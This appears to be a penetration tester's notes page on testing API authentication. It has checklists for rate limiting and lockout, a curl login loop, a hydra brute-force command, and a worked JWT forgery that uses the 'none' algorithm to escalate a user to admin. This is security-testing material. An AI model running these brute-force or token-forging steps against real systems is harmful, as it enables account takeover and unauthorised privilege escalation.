---
title: Authentication
description: Authentication is verifying the identity of the client that is trying to access an API endpoint
---

### Credential Testing
- [ ] Attempt multiple failed logins (10-20) with the same username
- [ ] Attempt logins with different usernames from the same IP
- [ ] Check for timing differences in responses
- [ ] Document the threshold at which rate limiting begins
- [ ] Check for sensitive data in URL parameters
- [ ] Test if credentials are transmitted in request body rather than URL
- [ ] Check if credentials are logged in server logs or client consoles

Example of a bash script to test rate limiting:
```bash
for i in {1..50}; do
  echo "Attempt $i"
  curl -X POST https://example.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"testuser","password":"wrongpassword123"}' \
    -w "Status: %{http_code}, Time: %{time_total}s\n" -o /dev/null -s
  sleep 1
done
```

#### Account lockout testing
- [ ] Attempt multiple failed logins to a test account
- [ ] Try to access the account after the lockout threshold
- [ ] Document the number of attempts before lockout
- [ ] Check if lockout is time-based or requires admin intervention
- [ ] Test if account lockout affects only the specific user or IP
- [ ] Check if lockout can be bypassed by using different authentication methods

### JWT
- Check if signature is verified
- Check if server accepts unassigned JWT
- Brute-force if weak signing key


## Exploit
**Token Analysis**
1. Find endpoint that returns token ![](../../../../public/images/API_autht_20250611%20_125804.png)
2. Send request to sequencer, set token location and start live capture. *Note: Also try select Base64-decode before analyzing* if the token is base64 ![](../../../../public/images/API_Auth_20250611%20_130624.png)
3. Look for **poor quality of randomness** and **Character-level analysis**.
4. Save tokens. 
```bash
head -n 100 tokens.txt
tail -n 10 tokens.txt | while read line; do echo "$line" | base64 -d; echo; done
```

Decode base64
```bash
echo -n 'YWRtaW4tMTA6MzY6MTctY3N2' | base64 -d 
```

**Bruteforce**
- Wordlist `~/Wordlist/SecLists/Usernames/Names/names.txt`
```bash
hydra -l admin -P passwords.txt example.com http-post-form "/api/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**JWT Signature Bypass**
```bash
# Original JWT
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiJ1c2VyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NDExODA5Mzd9.8FYMxQ3L_LhjdZ0CXnLHJ9ZQN0rply6uBTHtJ_IcaS4

# Decode header
echo -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
# {"alg":"HS256","typ":"JWT"}

# Decode payload
echo -n 'eyJ1c2VyaWQiOiJ1c2VyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NDExODA5Mzd9' | base64 -d
# {"userid":"user","role":"user","iat":1741180937}

# Modify payload to escalate privileges
echo -n '{"userid":"user","role":"admin","iat":1741180937}' | base64 | tr -d '=' | tr '/+' '_-'
# eyJ1c2VyaWQiOiJ1c2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzQxMTgwOTM3fQ

# Modify header to use 'none' algorithm
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Create modified JWT (without signature for 'none' algorithm)
modified_jwt="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyaWQiOiJ1c2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzQxMTgwOTM3fQ."

# Test with curl
curl -i https://example.com/api/admin -H "Authorization: Bearer $modified_jwt"
```